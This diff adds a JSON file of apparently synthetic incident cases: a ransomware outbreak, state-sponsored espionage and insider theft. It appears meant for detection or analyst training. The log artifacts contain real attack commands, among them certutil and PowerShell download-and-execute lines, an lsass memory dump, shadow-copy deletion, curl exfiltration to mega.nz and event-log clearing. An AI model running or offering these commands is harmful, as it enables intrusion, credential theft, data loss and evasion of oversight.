@@ -1,0 +1,228 @@
+[
+  {
+    "id": "CASE-2026-081",
+    "case_name": "BlackCat (ALPHV) Multi-Stage Ransomware Outbreak",
+    "threat_actor": "FIN7 / ALPHV Affiliate (DEV-0504)",
+    "target_organization": "Global Logistics Corp",
+    "incident_type": "Ransomware Pre-Encryption Burst",
+    "artifacts": [
+      {
+        "timestamp": "2026-10-29T10:14:02.110Z",
+        "source_type": "WEB_LOG",
+        "host": "WEB-SRV-IIS01",
+        "user": "IIS_IUSRS",
+        "process_name": "w3wp.exe",
+        "command_line": "POST /aspnet_client/system_web/shell.aspx - HTTP/1.1 200",
+        "target": "/aspnet_client/system_web/shell.aspx",
+        "severity": "CRITICAL"
+      },
+      {
+        "timestamp": "2026-10-29T10:14:15.340Z",
+        "source_type": "SYSMON_PROC",
+        "host": "WEB-SRV-IIS01",
+        "user": "IIS_IUSRS",
+        "ProcessId": 4128,
+        "ParentProcessId": 1820,
+        "Image": "C:\\Windows\\System32\\cmd.exe",
+        "CommandLine": "cmd.exe /c whoami /all && net localgroup administrators",
+        "ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
+        "severity": "HIGH"
+      },
+      {
+        "timestamp": "2026-10-29T10:16:42.500Z",
+        "source_type": "SYSMON_PROC",
+        "host": "WEB-SRV-IIS01",
+        "user": "IIS_IUSRS",
+        "ProcessId": 5290,
+        "ParentProcessId": 4128,
+        "Image": "C:\\Windows\\System32\\certutil.exe",
+        "CommandLine": "certutil.exe -urlcache -split -f http://185.220.101.5:8080/loader.exe C:\\ProgramData\\loader.exe",
+        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+        "severity": "CRITICAL"
+      },
+      {
+        "timestamp": "2026-10-29T10:18:05.120Z",
+        "source_type": "PREFETCH",
+        "host": "WEB-SRV-IIS01",
+        "user": "SYSTEM",
+        "executable": "PROCDUMP.EXE",
+        "run_count": 1,
+        "file_path": "C:\\Windows\\Prefetch\\PROCDUMP.EXE-5B12A81C.pf",
+        "severity": "CRITICAL"
+      },
+      {
+        "timestamp": "2026-10-29T10:18:12.780Z",
+        "source_type": "SYSMON_PROC",
+        "host": "WEB-SRV-IIS01",
+        "user": "SYSTEM",
+        "ProcessId": 6410,
+        "ParentProcessId": 5290,
+        "Image": "C:\\ProgramData\\procdump.exe",
+        "CommandLine": "C:\\ProgramData\\procdump.exe -accepteula -ma lsass.exe C:\\ProgramData\\lsass.dmp",
+        "ParentImage": "C:\\ProgramData\\loader.exe",
+        "severity": "CRITICAL"
+      },
+      {
+        "timestamp": "2026-10-29T10:24:33.200Z",
+        "source_type": "SECURITY_4624",
+        "host": "DC-PRIMARY01",
+        "user": "CORP\\da_admin",
+        "EventID": 4624,
+        "LogonType": 3,
+        "IpAddress": "10.0.4.15",
+        "severity": "HIGH"
+      },
+      {
+        "timestamp": "2026-10-29T10:24:34.050Z",
+        "source_type": "SECURITY_4672",
+        "host": "DC-PRIMARY01",
+        "user": "CORP\\da_admin",
+        "EventID": 4672,
+        "severity": "CRITICAL"
+      },
+      {
+        "timestamp": "2026-10-29T10:27:10.900Z",
+        "source_type": "SYSMON_PROC",
+        "host": "DC-PRIMARY01",
+        "user": "CORP\\da_admin",
+        "ProcessId": 7820,
+        "ParentProcessId": 1044,
+        "Image": "C:\\Windows\\System32\\vssadmin.exe",
+        "CommandLine": "vssadmin.exe delete shadows /all /quiet",
+        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+        "severity": "CRITICAL"
+      },
+      {
+        "timestamp": "2026-10-29T10:28:44.600Z",
+        "source_type": "SYSMON_PROC",
+        "host": "DC-PRIMARY01",
+        "user": "CORP\\da_admin",
+        "ProcessId": 8104,
+        "ParentProcessId": 7820,
+        "Image": "C:\\ProgramData\\blackcat.exe",
+        "CommandLine": "C:\\ProgramData\\blackcat.exe --access-token 9f8a2b3c4d5e --drop-ransom-note",
+        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+        "severity": "CRITICAL"
+      }
+    ]
+  },
+  {
+    "id": "CASE-2026-094",
+    "case_name": "APT29 (Cozy Bear) Phishing to Cloud Exfiltration",
+    "threat_actor": "APT29 / Midnight Blizzard (SVR)",
+    "target_organization": "National Defense Contractor",
+    "incident_type": "State-Sponsored Espionage",
+    "artifacts": [
+      {
+        "timestamp": "2026-10-29T13:02:11.000Z",
+        "source_type": "SYSMON_PROC",
+        "host": "WORKSTATION-ENG04",
+        "user": "CORP\\researcher1",
+        "ProcessId": 3210,
+        "ParentProcessId": 1400,
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwBkAG4ALQB1AHAAZABhAHQAZQAuAGMAbwBtAC8AcwB0AGEAZwBlAC4AcABzADEAJwApAA==",
+        "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "severity": "CRITICAL"
+      },
+      {
+        "timestamp": "2026-10-29T13:02:20.150Z",
+        "source_type": "POWERSHELL_4104",
+        "host": "WORKSTATION-ENG04",
+        "user": "CORP\\researcher1",
+        "EventID": 4104,
+        "ScriptBlockText": "$client = New-Object System.Net.WebClient; $stage = $client.DownloadString('http://cdn-update.com/stage.ps1'); Invoke-Expression $stage",
+        "severity": "CRITICAL"
+      },
+      {
+        "timestamp": "2026-10-29T13:08:45.300Z",
+        "source_type": "SYSMON_PROC",
+        "host": "WORKSTATION-ENG04",
+        "user": "CORP\\researcher1",
+        "ProcessId": 4890,
+        "ParentProcessId": 3210,
+        "Image": "C:\\Windows\\System32\\schtasks.exe",
+        "CommandLine": "schtasks.exe /create /tn \"WindowsUpdateAssist\" /tr \"powershell.exe -w hidden -enc ...\" /sc onlogon /ru SYSTEM",
+        "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "severity": "HIGH"
+      },
+      {
+        "timestamp": "2026-10-29T13:15:30.800Z",
+        "source_type": "PREFETCH",
+        "host": "WORKSTATION-ENG04",
+        "user": "CORP\\researcher1",
+        "executable": "SHARPHOUND.EXE",
+        "run_count": 1,
+        "file_path": "C:\\Windows\\Prefetch\\SHARPHOUND.EXE-14A29B0E.pf",
+        "severity": "CRITICAL"
+      },
+      {
+        "timestamp": "2026-10-29T13:28:10.450Z",
+        "source_type": "SYSMON_PROC",
+        "host": "WORKSTATION-ENG04",
+        "user": "CORP\\researcher1",
+        "ProcessId": 6120,
+        "ParentProcessId": 3210,
+        "Image": "C:\\Program Files\\7-Zip\\7z.exe",
+        "CommandLine": "7z.exe a -pEncryptedPass2026! C:\\Users\\researcher1\\AppData\\Local\\Temp\\intel_dump.7z D:\\Projects\\Propulsion\\*",
+        "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "severity": "HIGH"
+      },
+      {
+        "timestamp": "2026-10-29T13:34:55.900Z",
+        "source_type": "SYSMON_PROC",
+        "host": "WORKSTATION-ENG04",
+        "user": "CORP\\researcher1",
+        "ProcessId": 7430,
+        "ParentProcessId": 3210,
+        "Image": "C:\\Windows\\System32\\curl.exe",
+        "CommandLine": "curl.exe -F \"file=@C:\\Users\\researcher1\\AppData\\Local\\Temp\\intel_dump.7z\" https://api.mega.nz/upload?key=adversary_exfil",
+        "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "severity": "CRITICAL"
+      }
+    ]
+  },
+  {
+    "id": "CASE-2026-105",
+    "case_name": "Disgruntled Finance Officer Malicious Exfiltration",
+    "threat_actor": "Malicious Insider (CORP\\m_davis)",
+    "target_organization": "Apex Financial Partners",
+    "incident_type": "Insider Threat & IP Theft",
+    "artifacts": [
+      {
+        "timestamp": "2026-10-29T16:20:00.000Z",
+        "source_type": "SECURITY_4624",
+        "host": "FINANCE-DESK-09",
+        "user": "CORP\\m_davis",
+        "EventID": 4624,
+        "LogonType": 2,
+        "IpAddress": "127.0.0.1",
+        "severity": "LOW"
+      },
+      {
+        "timestamp": "2026-10-29T16:22:15.300Z",
+        "source_type": "SYSMON_PROC",
+        "host": "FINANCE-DESK-09",
+        "user": "CORP\\m_davis",
+        "ProcessId": 2410,
+        "ParentProcessId": 1100,
+        "Image": "C:\\Windows\\System32\\robocopy.exe",
+        "CommandLine": "robocopy.exe \"S:\\Confidential_M&A_Q4\" \"E:\\Backup_Docs\" /E /COPYALL",
+        "ParentImage": "C:\\Windows\\explorer.exe",
+        "severity": "HIGH"
+      },
+      {
+        "timestamp": "2026-10-29T16:29:40.800Z",
+        "source_type": "SYSMON_PROC",
+        "host": "FINANCE-DESK-09",
+        "user": "CORP\\m_davis",
+        "ProcessId": 3520,
+        "ParentProcessId": 1100,
+        "Image": "C:\\Windows\\System32\\wevtutil.exe",
+        "CommandLine": "wevtutil.exe cl Security && wevtutil.exe cl \"Microsoft-Windows-Sysmon/Operational\"",
+        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+        "severity": "CRITICAL"
+      }
+    ]
+  }
+]
